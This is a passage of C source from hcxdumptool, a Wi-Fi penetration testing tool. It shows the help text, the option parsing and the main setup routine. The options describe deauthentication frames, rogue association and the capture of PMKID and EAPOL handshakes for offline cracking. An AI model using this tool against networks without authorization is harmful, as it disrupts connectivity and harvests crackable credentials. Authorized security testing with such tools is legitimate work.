%llu seconds\\n\"\n\t\"-A             : ACK incoming frames\\n\"\n\t\"                  INTERFACE must support active monitor mode\\n\"\n\t\"-L             : show INTERFACE list and terminate\\n\"\n\t\"-l             : show INTERFACE list (tabulator separated and greppable) and terminate\\n\"\n\t\"-I <INTERFACE> : show detailed information about INTERFACE and terminate\\n\"\n#ifdef HCXWANTLIBPCAP\n\t\"--bpfc=<filter>: compile Berkeley Packet Filter (BPF) and exit\\n\"\n\t\"                  $ %s --bpfc=\\\"wlan addr3 112233445566\\\" > filter.bpf\\n\"\n\t\"                  see man pcap-filter\\n\"\n#endif\n\t\"--bpf=<file>   : input Berkeley Packet Filter (BPF) code (maximum %d instructions) in tcpdump decimal numbers format\\n\"\n\t\"                  see --help for more information\\n\"\n\t\"-h             : show this help\\n\"\n\t\"-v             : show version\\n\"\n\t\"\\n\",\n#ifdef HCXWANTLIBPCAP\n\teigenname, VERSION_TAG, VERSION_YEAR, eigenname, eigenname, eigenname, eigenname, TIMEHOLD / 1000000000ULL, eigenname, BPF_MAXINSNS);\n#else\n\teigenname, VERSION_TAG, VERSION_YEAR, eigenname, eigenname, eigenname, eigenname, TIMEHOLD / 1000000000ULL, BPF_MAXINSNS);\n#endif\nfprintf(stdout, \"less common options:\\n--------------------\\n\"\n\t\"-m <INTERFACE>            : set monitor mode and terminate\\n\"\n\t\"--disable_deauthentication: do not transmit DEAUTHENTICATION/DISASSOCIATION frames\\n\"\n\t\"--disable_proberequest    : do not transmit PROBEREQUEST frames\\n\"\n\t\"--disable_association     : do not AUTHENTICATE/ASSOCIATE\\n\"\n\t\"--disable_reassociation   : do not REASSOCIATE a CLIENT\\n\"\n\t\"--disable_beacon          : disable internal BEACON\\n\"\n\t\"                             default: one BEACON/second to wildcard SSID\\n\"\n\t\"--proberesponsetx=<digit> : transmit n PROBERESPONSEs from the ESSID ring buffer\\n\"\n\t\"                             default: %d\\n\"\n\t\"--essidlist=<file>        : initialize ESSID list with these ESSIDs\\n\"\n\t\"--errormax=<digit>        : set maximum allowed ERRORs\\n\"\n\t\"                             default: %d ERRORs\\n\"\n\t\"--watchdogmax=<seconds>   : set maximum TIMEOUT when no packets received\\n\"\n\t\"                             default: %d seconds\\n\"\n\t\"--attemptclientmax=<digit>: set maximum of attempts to request an EAPOL M2\\n\"\n\t\"                             default: %d attempts\\n\"\n\t\"                             to disable CLIENT attacks set 0\\n\"\n\t\"--attemptapmax=<digit>    : set maximum of received BEACONs to request a PMKID or to get a 4-way handshake\\n\"\n\t\"                             default: stop after %d received BEACONs\\n\"\n\t\"                             attemptapmax=0 include this options:\\n\"\n\t\"                              disable_deauthentication: do not transmit DEAUTHENTICATION/DISASSOCIATION frames\\n\"\n\t\"                              disable_proberequest    : do not transmit PROBEREQUEST frames\\n\"\n\t\"                              disable_association     : do not AUTHENTICATE/ASSOCIATE\\n\"\n\t\"                              disable_reassociation   : do not REASSOCIATE a CLIENT\\n\",\n\tPROBERESPONSETX_MAX, ERROR_MAX, WATCHDOG_MAX, ATTEMPTCLIENT_MAX, ATTEMPTAP_MAX / 8);\nfprintf(stdout, \"--tot=<digit>             : enable timeout timer in minutes\\n\"\n\t\"--exitoneapol=<type>      : exit on first EAPOL occurrence:\\n\"\n\t\"                             bitmask:\\n\"\n\t\"                              1 = PMKID (from AP)\\n\"\n\t\"                              2 = EAPOL M2M3 (authorized)\\n\"\n\t\"                              4 = EAPOL M1M2/M1M2ROGUE (not authorized)\\n\"\n\t\"                              8 = EAPOL M1\\n\"\n\t\"                             target BPF filter is recommended\\n\"\n\t\"--onsigterm=<action>      : action when the program has been terminated (poweroff, reboot)\\n\"\n\t\"                             poweroff: power off system\\n\"\n\t\"                             reboot:   reboot system\\n\"\n\t\"--ongpiobutton=<action>   : action when the program has been terminated (poweroff, reboot)\\n\"\n\t\"                             poweroff: power off system\\n\"\n\t\"                             reboot:   reboot system\\n\"\n\t\"--ontot=<action>          : action when the program has been terminated (poweroff, reboot)\\n\"\n\t\"                             poweroff: power off system\\n\"\n\t\"                             reboot:   reboot system\\n\"\n\t\"--onwatchdog=<action>     : action when the program has been terminated (poweroff, reboot)\\n\"\n\t\"                             poweroff: power off system\\n\"\n\t\"                             reboot:   reboot system\\n\"\n\t\"--onerror=<action>        : action when the program has been terminated (poweroff, reboot)\\n\"\n\t\"                             poweroff: power off system\\n\"\n\t\"                             reboot:   reboot system\\n\"\n\t\"--gpio_button=<digit>     : Raspberry Pi GPIO pin number of button (2...27)\\n\"\n\t\"                             push GPIO button (> 10 seconds) to terminate program\\n\"\n\t\"                             default: 0 (GPIO not in use)\\n\"\n\t\"--gpio_statusled=<digit>  : Raspberry Pi GPIO number of status LED (2...27)\\n\"\n\t\"                             default: 0 (GPIO not in use)\\n\"\n\t#ifdef HCXNMEAOUT\n\t\"--nmea_dev=<NMEA device>  : open NMEA device (/dev/ttyACM0, /dev/tty/USB0, ...)\\n\"\n\t\"                             baudrate = BD9600\\n\"\n\t\"--gpsd                    : use gpsd to get position\\n\"\n\t\"                             gpsd will be switched to NMEA0183 mode\\n\"\n\t\"--nmea_out=<outfile>      : write GPS information to a nmea-format file named <outfile>\\n\"\n\t\"                             default outfile name: yyyymmddhhmmss.nmea\\n\"\n\t\"                             output: NMEA 0183 standard messages:\\n\"\n\t\"                                     $GPRMC: Position, velocity, time and date\\n\"\n\t\"                                     $GPGGA: Position, orthometric height, fix related data, time\\n\"\n\t\"                                     $GPWPL: Position and MAC AP\\n\"\n\t\"                                     $GPTXT: ESSID in HEX ASCII\\n\"\n\t\"                             use gpsbabel to convert to other formats:\\n\"\n\t\"                              gpsbabel -w -t -i nmea -f in_file.nmea -o gpx -F out_file.gpx\\n\"\n\t\"                              gpsbabel -w -t -i nmea -f in_file.nmea -o kml -F out_file.kml\\n\"\n\t\"                             get more information: https://en.wikipedia.org/wiki/NMEA_0183\\n\"\n\t\"--nmea_pcapng             : write GPS information to pcapng dump file\\n\"\n\t#endif\n\t\"--rcascan=<character>     : do (R)adio (C)hannel (A)ssignment scan only\\n\"\n\t\"                             default = passive scan\\n\"\n\t\"                             a = active scan\\n\"\n\t\"                                 no PROBERESPONSE, AP is out of RANGE, packet injection is broken\\n\"\n\t\"                             p = passive scan\\n\"\n\t\"                            packets are not stored to dump file\\n\"\n\t\"                            not in combination with attack modes\\n\");\n\t#ifdef HCXSTATUSOUT\n\tfprintf(stdout, \"--rds=<digit>             : sort real time display\\n\"\n\t\t\t\"                             attack mode:\\n\"\n\t\t\t\"                              default: sort by time (last seen on top)\\n\"\n\t\t\t\"                               1 = sort by status (last PMKID/EAPOL on top)\\n\"\n\t\t\t\"                             scan mode:\\n\"\n\t\t\t\"                               1 = sort by PROBERESPONSE count\\n\"\n\t\t\t\"                             Columns:\\n\"\n\t\t\t\"                              R = + AP display     : AP is in TX range or under attack\\n\"\n\t\t\t\"                              S = + AP display     : AUTHENTICATION KEY MANAGEMENT PSK\\n\"\n\t\t\t\"                              P = + AP display     : got PMKID hashcat / JtR can work on\\n\"\n\t\t\t\"                              1 = + AP display     : got EAPOL M1 (CHALLENGE)\\n\"\n\t\t\t\"                              3 = + AP display     : got EAPOL M1M2M3 or EAPOL M1M2M3M4 (AUTHORIZATION) hashcat / JtR can work on\\n\"\n\t\t\t\"                              E = + CLIENT display : got EAP-START MESSAGE\\n\"\n\t\t\t\"                              2 = + CLIENT display : got EAPOL M1M2 (ROGUE CHALLENGE) hashcat / JtR can work on\\n\");\n\n\t#endif\nfprintf(stdout, \"--help                    : show additional help (example and trouble shooting)\\n\"\n\t\t\"--version                 : show version\\n\\n\");\nexit(EXIT_SUCCESS);\n}\n/*---------------------------------------------------------------------------*/\n__attribute__ ((noreturn))\nstatic inline void usageerror(char *eigenname)\n{\nfprintf(stdout, \"%s %s (C) %s by ZeroBeat\\n\"\n\t\"This is a penetration testing tool!\\n\"\n\t\"It is made to detect vulnerabilities in your NETWORK mercilessly!\\n\"\n\t\"\\n\"\n\t\"usage:\\n\"\n\t\" $ %s -h for an overview of all options\\n\"\n\t\" $ %s --help for an example and trouble shooting\\n\",\n\t eigenname, VERSION_TAG, VERSION_YEAR, eigenname, eigenname);\nexit(EXIT_FAILURE);\n}\n/*===========================================================================*/\nint main(int argc, char *argv[])\n{\nstatic int auswahl = -1;\nstatic int index = 0;\nstatic u8 exiteapolflag = 0;\nstatic u8 exitsigtermflag = 0;\nstatic u8 exitgpiobuttonflag = 0;\nstatic u8 exittotflag = 0;\nstatic u8 exitwatchdogflag = 0;\nstatic u8 exiterrorflag = 0;\nstatic struct timespec tspecifo, tspeciforem;\nstatic bool monitormodeflag = false;\nstatic bool interfaceinfoflag = false;\nstatic bool interfacefrequencyflag = false;\nstatic bool interfacelistflag = false;\nstatic bool interfacelistshortflag = false;\nstatic bool rooterrorflag = false;\nstatic char *rcascanflag = NULL;\nstatic char *bpfname = NULL;\n#ifdef HCXWANTLIBPCAP\nstatic char *bpfstring = NULL;\n#endif\nstatic char *essidlistname = NULL;\nstatic char *userchannellistname = NULL;\nstatic char *userfrequencylistname = NULL;\nstatic char *pcapngoutname = NULL;\n#ifdef HCXNMEAOUT\nstatic bool gpsdflag = false;\nstatic char *nmea0183name = NULL;\nstatic char *nmeaoutname = NULL;\n#endif\nstatic const char *rebootstring = \"reboot\";\nstatic const char *poweroffstring = \"poweroff\";\nstatic const char *short_options = \"i:w:c:f:m:I:t:FLlAhHv\";\nstatic struct tpacket_stats lStats = { 0 };\nstatic socklen_t lStatsLength = sizeof(lStats);\nstatic const struct option long_options[] =\n{\n\t{\"bpf\",\t\t\t\trequired_argument,\tNULL,\tHCX_BPF},\n#ifdef HCXWANTLIBPCAP\n\t{\"bpfc\",\t\t\trequired_argument,\tNULL,\tHCX_BPFC},\n#endif\n\t{\"disable_deauthentication\",\tno_argument,\t\tNULL,\tHCX_DISABLE_DEAUTHENTICATION},\n\t{\"disable_proberequest\",\tno_argument,\t\tNULL,\tHCX_DISABLE_PROBEREQUEST},\n\t{\"disable_association\",\t\tno_argument,\t\tNULL,\tHCX_DISABLE_ASSOCIATION},\n\t{\"disable_reassociation\",\tno_argument,\t\tNULL,\tHCX_DISABLE_REASSOCIATION},\n\t{\"disable_beacon\",\t\tno_argument,\t\tNULL,\tHCX_DISABLE_BEACON},\n\t{\"proberesponsetx\",\t\trequired_argument,\tNULL,\tHCX_PROBERESPONSETX_MAX},\n\t{\"attemptclientmax\",\t\trequired_argument,\tNULL,\tHCX_ATTEMPT_CLIENT_MAX},\n\t{\"attemptapmax\",\t\trequired_argument,\tNULL,\tHCX_ATTEMPT_AP_MAX},\n\t{\"tot\",\t\t\t\trequired_argument,\tNULL,\tHCX_TOT},\n\t{\"essidlist\",\t\t\trequired_argument,\tNULL,\tHCX_ESSIDLIST},\n\t#ifdef HCXNMEAOUT\n\t{\"nmea_dev\",\t\t\trequired_argument,\tNULL,\tHCX_NMEA0183},\n\t{\"gpsd\",\t\t\tno_argument,\t\tNULL,\tHCX_GPSD},\n\t{\"nmea_out\",\t\t\trequired_argument,\tNULL,\tHCX_NMEA0183_OUT},\n\t{\"nmea_pcapng\",\t\t\tno_argument,\t\tNULL,\tHCX_NMEA0183_PCAPNG},\n\t#endif\n\t{\"errormax\",\t\t\trequired_argument,\tNULL,\tHCX_ERROR_MAX},\n\t{\"watchdogmax\",\t\t\trequired_argument,\tNULL,\tHCX_WATCHDOG_MAX},\n\t{\"onsigterm\",\t\t\trequired_argument,\tNULL,\tHCX_ON_SIGTERM},\n\t{\"ongpiobutton\",\t\trequired_argument,\tNULL,\tHCX_ON_GPIOBUTTON},\n\t{\"ontot\",\t\t\trequired_argument,\tNULL,\tHCX_ON_TOT},\n\t{\"onwatchdog\",\t\t\trequired_argument,\tNULL,\tHCX_ON_WATCHDOG},\n\t{\"exitoneapol\",\t\t\trequired_argument,\tNULL,\tHCX_EXIT_ON_EAPOL},\n\t{\"onerror\",\t\t\trequired_argument,\tNULL,\tHCX_ON_ERROR},\n\t{\"gpio_button\",\t\t\trequired_argument,\tNULL,\tHCX_GPIO_BUTTON},\n\t{\"gpio_statusled\",\t\trequired_argument,\tNULL,\tHCX_GPIO_STATUSLED},\n\t{\"rcascan\",\t\t\trequired_argument,\tNULL,\tHCX_RCASCAN},\n\t#ifdef HCXSTATUSOUT\n\t{\"rds\",\t\t\t\trequired_argument,\tNULL,\tHCX_RD_SORT},\n\t#endif\n\t{\"version\",\t\t\tno_argument,\t\tNULL,\tHCX_VERSION},\n\t{\"help\",\t\t\tno_argument,\t\tNULL,\tHCX_HELP_ADDITIONAL},\n\t{NULL,\t\t\t\t0,\t\t\tNULL,\t0}\n};\noptind = 1;\noptopt = 0;\nwhile((auswahl = getopt_long(argc, argv, short_options, long_options, &index)) != -1)\n\t{\n\tswitch (auswahl)\n\t\t{\n\t\tcase HCX_IFNAME:\n\t\tif((ifaktindex = if_nametoindex(optarg)) == 0)\n\t\t\t{\n\t\t\tperror(\"failed to get interface index\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tstrncpy(ifaktname, optarg, IF_NAMESIZE -1);\n\t\tbreak;\n\n\t\tcase HCX_BPF:\n\t\tbpfname = optarg;\n\t\tbreak;\n\n#ifdef HCXWANTLIBPCAP\n\t\tcase HCX_BPFC:\n\t\tbpfstring = optarg;\n\t\tif(strlen(bpfstring) < 2)\n\t\t\t{\n\t\t\tfprintf(stderr, \"BPF ERROR\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tbreak;\n#endif\n\t\tcase HCX_PCAPNGNAME:\n\t\tpcapngoutname = optarg;\n\t\tbreak;\n\n\t\tcase HCX_SET_SCANLIST_FROM_INTERFACE:\n\t\tinterfacefrequencyflag = true;\n\t\tbreak;\n\n\t\tcase HCX_SET_SCANLIST_FROM_USER_FREQ:\n\t\tuserfrequencylistname = optarg;\n\t\tbreak;\n\n\t\tcase HCX_SET_SCANLIST_FROM_USER_CH:\n\t\tuserchannellistname = optarg;\n\t\tbreak;\n\n\t\tcase HCX_ESSIDLIST:\n\t\tessidlistname = optarg;\n\t\tbreak;\n\n\t\tcase HCX_DISABLE_DEAUTHENTICATION:\n\t\tdeauthenticationflag = false;\n\t\tbreak;\n\n\t\tcase HCX_DISABLE_PROBEREQUEST:\n\t\tproberequestflag = false;\n\t\tbreak;\n\n\t\tcase HCX_DISABLE_ASSOCIATION:\n\t\tassociationflag = false;\n\t\tbreak;\n\n\t\tcase HCX_DISABLE_REASSOCIATION:\n\t\treassociationflag = false;\n\t\tbreak;\n\n\t\tcase HCX_DISABLE_BEACON:\n\t\tbeaconoffflag = true;\n\t\tbreak;\n\n\t\tcase HCX_PROBERESPONSETX_MAX:\n\t\tproberesponsetxmax = strtoul(optarg, NULL, 10);\n\t\tif((proberesponsetxmax == 0) || (proberesponsetxmax > (APRGLIST_MAX - 1)))\n\t\t\t{\n\t\t\tfprintf(stderr, \"must be greater than > 0 and < than %d \\n\", APRGLIST_MAX - 1);\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tbreak;\n\n\t\tcase HCX_ATTEMPT_CLIENT_MAX:\n\t\tattemptclientmax = strtoul(optarg, NULL, 10);\n\t\tbreak;\n\n\t\tcase HCX_ATTEMPT_AP_MAX:\n\t\tif((attemptapmax = strtoul(optarg, NULL, 10)) > 0) attemptapmax *= 8;\n\t\telse\n\t\t\t{\n\t\t\tdeauthenticationflag = false;\n\t\t\tproberequestflag = false;\n\t\t\tassociationflag = false;\n\t\t\treassociationflag = false;\n\t\t\t}\n\t\tbreak;\n\n\t\tcase HCX_HOLD_TIME:\n\t\tif((timehold = strtoull(optarg, NULL, 10)) < 2)\n\t\t\t{\n\t\t\tfprintf(stderr, \"hold time must be > 2 seconds\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\ttimehold *= 1000000000ULL;\n\t\tbreak;\n\n\t\tcase HCX_TOT:\n\t\tif((tottime = strtoul(optarg, NULL, 10)) < 1)\n\t\t\t{\n\t\t\tfprintf(stderr, \"time out timer must be > 0 minutes\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\ttottime *= 60;\n\t\tbreak;\n\n\t\tcase HCX_WATCHDOG_MAX:\n\t\tif((watchdogcountmax = atoi(optarg)) < 1)\n\t\t\t{\n\t\t\tfprintf(stderr, \"time out timer must be > 0\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tbreak;\n\n\t\tcase HCX_ERROR_MAX:\n\t\tif((errorcountmax = atoi(optarg)) < 1)\n\t\t\t{\n\t\t\tfprintf(stderr, \"error counter must be > 0\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tbreak;\n\n\t\tcase HCX_EXIT_ON_EAPOL:\n\t\texiteapolflag = (atoi(optarg) & 0x0f) << 4;\n\t\texiteapolpmkidflag |= exiteapolflag & EXIT_ON_EAPOL_PMKID;\n\t\texiteapolm2flag |= exiteapolflag & EXIT_ON_EAPOL_M2;\n\t\texiteapolm3flag |= exiteapolflag & EXIT_ON_EAPOL_M3;\n\t\texiteapolm1flag |= exiteapolflag & EXIT_ON_EAPOL_M1;\n\t\tbreak;\n\n\t\tcase HCX_ON_SIGTERM:\n\t\tif(strncmp(rebootstring, optarg, 8) == 0) exitsigtermflag = EXIT_ACTION_REBOOT;\n\t\telse if(strncmp(poweroffstring, optarg, 8) == 0) exitsigtermflag = EXIT_ACTION_POWEROFF;\n\t\tbreak;\n\n\t\tcase HCX_ON_GPIOBUTTON:\n\t\tif(strncmp(rebootstring, optarg, 8) == 0) exitgpiobuttonflag = EXIT_ACTION_REBOOT;\n\t\telse if(strncmp(poweroffstring, optarg, 8) == 0) exitgpiobuttonflag = EXIT_ACTION_POWEROFF;\n\t\tbreak;\n\n\t\tcase HCX_ON_TOT:\n\t\tif(strncmp(rebootstring, optarg, 8) == 0) exittotflag = EXIT_ACTION_REBOOT;\n\t\telse if(strncmp(poweroffstring, optarg, 8) == 0) exittotflag = EXIT_ACTION_POWEROFF;\n\t\tbreak;\n\n\t\tcase HCX_ON_WATCHDOG:\n\t\tif(strncmp(rebootstring, optarg, 8) == 0) exitwatchdogflag = EXIT_ACTION_REBOOT;\n\t\telse if(strncmp(poweroffstring, optarg, 8) == 0) exitwatchdogflag = EXIT_ACTION_POWEROFF;\n\t\tbreak;\n\n\t\tcase HCX_ON_ERROR:\n\t\tif(strncmp(rebootstring, optarg, 8) == 0) exiterrorflag = EXIT_ACTION_REBOOT;\n\t\telse if(strncmp(poweroffstring, optarg, 8) == 0) exiterrorflag = EXIT_ACTION_POWEROFF;\n\t\tbreak;\n\n\t\tcase HCX_GPIO_BUTTON:\n\t\tgpiobutton = strtol(optarg, NULL, 10);\n\t\tif((gpiobutton < 2) || (gpiobutton > 27))\n\t\t\t{\n\t\t\tfprintf(stderr, \"invalid GPIO option\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tif(gpiostatusled == gpiobutton)\n\t\t\t{\n\t\t\tfprintf(stderr, \"GPIO pin ERROR (same value of GPIO button and GPIO status LED)\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tbreak;\n\n\t\tcase HCX_GPIO_STATUSLED:\n\t\tgpiostatusled = strtol(optarg, NULL, 10);\n\t\tif((gpiostatusled < 2) || (gpiostatusled > 27))\n\t\t\t{\n\t\t\tfprintf(stderr, \"invalid GPIO option\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tif(gpiostatusled == gpiobutton)\n\t\t\t{\n\t\t\tfprintf(stderr, \"GPIO pin ERROR (same value of GPIO button and GPIO status LED)\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tbreak;\n\n\t\tcase HCX_INTERFACE_INFO:\n\t\tif((ifaktindex = if_nametoindex(optarg)) == 0)\n\t\t\t{\n\t\t\tperror(\"failed to get interface index\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tstrncpy(ifaktname, optarg, IF_NAMESIZE -1);\n\t\tinterfaceinfoflag = true;\n\t\tbreak;\n\n\t\tcase HCX_SET_MONITORMODE:\n\t\tif((ifaktindex = if_nametoindex(optarg)) == 0)\n\t\t\t{\n\t\t\tperror(\"failed to get interface index\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tstrncpy(ifaktname, optarg, IF_NAMESIZE -1);\n\t\tmonitormodeflag = true;\n\t\tbreak;\n\n\t\tcase HCX_SHOW_INTERFACE_LIST:\n\t\tif(interfacelistshortflag == true)\n\t\t\t{\n\t\t\tfprintf(stderr, \"combination of options -L and -l is not allowed\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tinterfacelistflag = true;\n\t\tbreak;\n\n\t\tcase HCX_SHOW_INTERFACE_LIST_SHORT:\n\t\tif(interfacelistflag == true)\n\t\t\t{\n\t\t\tfprintf(stderr, \"combination of options -L and -l is not allowed\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tinterfacelistshortflag = true;\n\t\tbreak;\n\n\t\t#ifdef HCXNMEAOUT\n\t\tcase HCX_NMEA0183:\n\t\tif(gpsdflag == true)\n\t\t\t{\n\t\t\tfprintf(stderr, \"nmea_dev not allowed in combination with gpsd\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tnmea0183name = optarg;\n\t\tbreak;\n\n\t\tcase HCX_GPSD:\n\t\tif(nmea0183name != NULL)\n\t\t\t{\n\t\t\tfprintf(stderr, \"gpsd not allowed in combination with nmea_dev\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tgpsdflag = true;\n\t\tbreak;\n\n\t\tcase HCX_NMEA0183_OUT:\n\t\tnmeaoutname = optarg;\n\t\tbreak;\n\n\t\tcase HCX_NMEA0183_PCAPNG:\n\t\tnmea2pcapflag = true;\n\t\tbreak;\n\t\t#endif\n\n\t\tcase HCX_RCASCAN:\n\t\trcascanflag = optarg;\n\t\tif((rcascanflag[0] != 'a') && (rcascanflag[0] != 'p'))\n\t\t\t{\n\t\t\tfprintf(stderr, \"rcascan: only (a) active or (p) passive allowed\\n\");\n\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\tbreak;\n\n\t\t#ifdef HCXSTATUSOUT\n\t\tcase HCX_RD_SORT:\n\t\trdsort = strtol(optarg, NULL, 10);\n\t\tbreak;\n\t\t#endif\n\n\t\tcase HCX_SET_MONITORMODE_ACTIVE:\n\t\tactivemonitorflag = true;\n\t\tbreak;\n\n\t\tcase HCX_HELP:\n\t\tusage(basename(argv[0]));\n\t\tbreak;\n\n\t\tcase HCX_HELP_ADDITIONAL:\n\t\tusage_additional(basename(argv[0]));\n\t\tbreak;\n\n\t\tcase HCX_VERSION:\n\t\tversion(basename(argv[0]));\n\t\tbreak;\n\n\t\tcase '?':\n\t\tusageerror(basename(argv[0]));\n\t\tbreak;\n\n\t\tdefault:\n\t\tusageerror(basename(argv[0]));\n\t\t}\n\t}\nsetbuf(stdout, NULL);\nhcxpid = getpid();\n#ifdef HCXDEBUG\nif((fh_debug = fopen(\"hcxdumptool.log\", \"a\")) == NULL)\n\t{\n\tfprintf(stdout, \"error opening fhcxdumptool.log: %s\\n\", strerror(errno));\n\texit(EXIT_FAILURE);\n\t}\n#endif\n#ifdef HCXWANTLIBPCAP\nif(bpfstring != NULL)\n\t{\n\tif(compile_bpf(bpfstring) == true) exit(EXIT_SUCCESS);\n\telse exit(EXIT_SUCCESS);\n\t}\n#endif\nif(interfacelistshortflag == false)\n\t{\n\tfprintf(stdout, \"\\nRequesting physical interface capabilities. This may take some time.\\n\"\n\t\t\t\"Please be patient...\\n\\n\");\n\t}\nif(set_signal_handler() == false)\n\t{\n\terrorcount++;\n\tfprintf(stderr, \"failed to initialize signal handler\\n\");\n\tgoto byebye;\n\t}\nif((gpiobutton + gpiostatusled) > 0)\n\t{\n\tif(init_rpi() == false)\n\t\t{\n\t\terrorcount++;\n\t\tfprintf(stderr, \"failed to initialize Raspberry Pi GPIO\\n\");\n\t\tgoto byebye;\n\t\t}\n\t}\nif(init_lists() == false)\n\t{\n\terrorcount++;\n\tfprintf(stderr, \"failed to initialize lists\\n\");\n\tgoto byebye;\n\t}\ninit_values();\n#ifdef HCXNMEAOUT\nif(nmea0183name != NULL)\n\t{\n\tif(open_device_nmea0183(nmea0183name, nmeaoutname) == false)\n\t\t{\n\t\terrorcount++;\n\t\tfprintf(stderr, \"failed to open NMEA0183 device\\n\");\n\t\tgoto byebye;\n\t\t}\n\t}\nif(gpsdflag == true)\n\t{\n\tif(open_socket_gpsd(nmeaoutname) == false)\n\t\t{\n\t\terrorcount++;\n\t\tfprintf(stderr, \"failed to connect to GPSD\\n\");\n\t\tgoto byebye;\n\t\t}\n\t}\n#endif\n/*---------------------------------------------------------------------------*/\nif(open_control_sockets() == false)\n\t{\n\terrorcount++;\n\tfprintf(stderr, \"failed to open control sockets\\n\");\n\tgoto byebye;\n\t}\nif(get_interfacelist() == false)\n\t{\n\terrorcount++;\n\tfprintf(stderr, \"failed to get interface list\\n\");\n\tgoto byebye;\n\t}\nif(interfacelistflag == true)\n\t{\n\tshow_interfacelist();\n\tgoto byebye;\n\t}\nif(interfacelistshortflag == true)\n\t{\n\tshow_interfacelist_short();\n\tgoto byebye;\n\t}\nif(interfaceinfoflag == true)\n\t{\n\tshow_interfacecapabilities();\n\tgoto byebye;\n\t}\n/*---------------------------------------------------------------------------*/\nif(getuid() != 0)\n\t{\n\terrorcount++;\n\tfprintf(stderr, \"%s must be run as root\\n\", basename(argv[0]));\n\trooterrorflag = true;\n\tgoto byebye;\n\t}\nif(set_interface(interfacefrequencyflag, userfrequencylistname, userchannellistname, monitormodeflag) == false)\n\t{\n\terrorcount++;\n\tfprintf(stderr, \"failed to arm interface\\n\");\n\tgoto byebye;\n\t}\nif(monitormodeflag == true)\n\t{\n\tif(set_monitormode() == false)\n\t\t{\n\t\terrorcount++;\n\t\tfprintf(stderr, \"failed to set monitor mode\\n\");\n\t\t}\n\tif((userfrequencylistname != NULL) || (userchannellistname != 0))\n\t\t{\n\t\tif(nl_set_frequency() == false)\n\t\t\t{\n\t\t\terrorcount++;\n\t\t\tfprintf(stderr, \"failed to set frequency\\n\");\n\t\t\t}\n\t\t}\n\tgoto byebye;\n\t}\nif(essidlistname != NULL) read_essidlist(essidlistname);\nif(rcascanflag == NULL)\n\t{\n\tif(open_pcapng(pcapngoutname) == false)\n\t\t{\n\t\terrorcount++;\n\t\tfprintf(stderr, \"failed to open dump file\\n\");\n\t\tgoto byebye;\n\t\t}\n\t}\nif(open_socket_rx(bpfname) == false)\n\t{\n\terrorcount++;\n\tfprintf(stderr, \"failed to open raw packet socket\\n\");\n\tgoto byebye;\n\t}\nif(open_socket_tx() == false)\n\t{\n\terrorcount++;\n\tfprintf(stderr, \"failed to open transmit socket\\n\");\n\tgoto byebye;\n\t}\nif(rcascanflag == NULL)\n\t{\n\tif(set_timer() == false)\n\t\t{\n\t\terrorcount++;\n\t\tfprintf(stderr, \"failed to initialize timer\\n\");\n\t\tgoto byebye;\n\t\t}\n\t}\nelse\n\t{\n\tif(set_timer_rca() == false)\n\t\t{\n\t\terrorcount++;\n\t\tfprintf(stderr, \"failed to initialize timer\\n\");\n\t\tgoto byebye;\n\t\t}\n\t}\n/*---------------------------------------------------------------------------*/\ntspecifo.tv_sec = 5;\ntspecifo.tv_nsec = 0;\nfprintf(stdout, \"\\nThis is a highly experimental penetration testing tool!\\n\"\n\t\t\"It is made to detect vulnerabilities in your NETWORK mercilessly!\\n\"\n\t\t\"Misuse a network, without specific authorization,\\n\"\n\t\t\"may cause irreparable damage and result in significant consequences!\\n\"\n\t\t\"Not understanding what you were doing> is not going to work as an excuse!\\n\\n\");\nif(vmflag == false) fprintf(stdout, \"Failed to set virtual MAC!\\n\");\nif(bpf.len == 0) fprintf(stderr, \"BPF is unset! Make sure hcxdumptool is running in a 100%% controlled environment!\\n\\n\");\nfprintf(stdout, \"Initialize main scan loop...\\033[?25l\");\nnanosleep(&tspecifo, &tspeciforem);\nif(rcascanflag == NULL)\n\t{\n\tif(nl_scanloop() == false)\n\t\t{\n\t\terrorcount++;\n\t\tfprintf(stderr, \"failed to initialize main scan loop\\n\");\n\t\t}\n\t}\nelse\n\t{\n\tif(nl_scanloop_rca(rcascanflag) == false)\n\t\t{\n\t\terrorcount++;\n\t\tfprintf(stderr, \"failed to initialize rca scan loop\\n\");\n\t\t}\n\t}\n/*---------------------------------------------------------------------------*/\nbyebye:\n#ifdef HCXDEBUG\nif(fh_debug != NULL) fclose(fh_debug);\n#endif\nif((monitormodeflag != true) && (interfacelistflag != true) && (interfaceinfoflag != true) && (interfacelistshortflag != true) && (rooterrorflag == false))\n\t{\n\tif(getsockopt(fd_socket_rx, SOL_PACKET, PACKET_STATISTICS, &lStats, &lStatsLength) != 0) fprintf(stdout, \"PACKET_STATISTICS failed\\n\");\n\t}\nclose_fds();\nclose_sockets();\nclose_lists();\nif(rooterrorflag == true) exit(EXIT_FAILURE);\nif((monitormodeflag == true) || (interfacelistflag == true) || (interfaceinfoflag == true) || (interfacelistshortflag == true)) return EXIT_SUCCESS;\nfprintf(stdout, \"\\n\\033[?25h\");\nerrorcount += errortxcount;\nif(errorcount > 0) fprintf(stderr, \"%u ERROR(s) during runtime\\n\", errorcount);\nif(errortxcount > 0) fprintf(stderr, \"%u TX ERROR(s) during runtime\\n\", errortxcount);\nif(errorcount > 0) fprintf(stderr, \"Possible reasons:\\n\"\n\t\t\t\" driver is broken\\n\"\n\t\t\t\" driver is busy (misconfigured system, other services access the INTERFACE)\\n\");\nfprintf(stdout, \"%u Packet(s) captured by 